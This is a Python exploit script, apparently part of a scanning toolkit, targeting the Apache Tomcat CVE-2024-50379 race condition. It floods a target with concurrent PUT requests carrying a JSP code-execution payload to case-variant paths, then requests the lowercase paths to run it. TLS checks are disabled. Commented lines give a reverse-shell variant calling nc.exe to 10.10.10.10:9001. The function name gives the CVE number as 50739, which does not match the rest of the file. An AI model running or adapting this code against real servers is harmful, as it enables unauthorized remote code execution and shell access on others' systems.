import concurrent.futures
import logging
import ssl
from urllib.parse import urljoin
from urllib.parse import urlparse
import requests
import urllib3

from common.common import getRandomUserAgent

ssl._create_default_https_context = ssl._create_unverified_context
# 忽略HTTPS请求中的不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志格式，输出INFO级别及以上的日志消息
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()


def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check_cve_2024_50739(url, config):
    protocols = ['http://', 'https://']
    found_vulnerabilities = False
    parsed_url = urlparse(url)
    # 自动去掉端口号
    target_host = parsed_url.hostname
    # 从配置文件中读取 Tomcat 的 AJP 端口、文件路径和判断条件
    target_port = config['CVE-2024-50379']['port']
    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        logging.info(f"Checking {target_url}...")

        target_url_put1 = urljoin(target_url, "/aa.Jsp")
        target_url_put2 = urljoin(target_url, "/bb.Jsp")
        target_url_get1 = urljoin(target_url, "/aa.jsp")
        target_url_get2 = urljoin(target_url, "/bb.jsp")

        headers1 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Content-Type": "application/json"
        }

        headers2 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }
        # nc.exe 10.10.10.10 9001 -e sh
        payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
        # payload_put = "aa<% Runtime.getRuntime().exec(\"nc.exe 10.10.10.10 9001 -e sh\");%>"

    # 增加线程
    with concurrent.futures.ThreadPoolExecutor(max_workers=10000) as executor:
        futures = []
        # 循环执行10000次
        for _ in range(200):
            futures.append(
                executor.submit(requests.put, target_url_put1, verify=False, headers=headers1, data=payload_put))
            futures.append(
                executor.submit(requests.put, target_url_put2, verify=False, headers=headers1, data=payload_put))
            futures.append(executor.submit(requests.get, target_url_get1, verify=False, headers=headers2))
            futures.append(executor.submit(requests.get, target_url_get2, verify=False, headers=headers2))

        for future in concurrent.futures.as_completed(futures):
            try:
                response = future.result()
                if isinstance(response, requests.Response):
                    if (response.status_code == 201) or (response.status_code == 200):
                        logging.info(f"\033[31mResponse status: {response.status_code}\033[0m")
                        found_vulnerabilities = True
            except Exception as e:
                logging.warning(f"Error occurred: {e}")
                return False, None, None

        if found_vulnerabilities:
            logging.info(f"\033[31mFind: {url}: Apache Tomcat CVE-2024-50379 Conditional Competition To RCE!\033[0m")
            return True, "ApachTomcat_CVE-2024-50379", f"http://{target_host}:{target_port}/aa.Jsp"


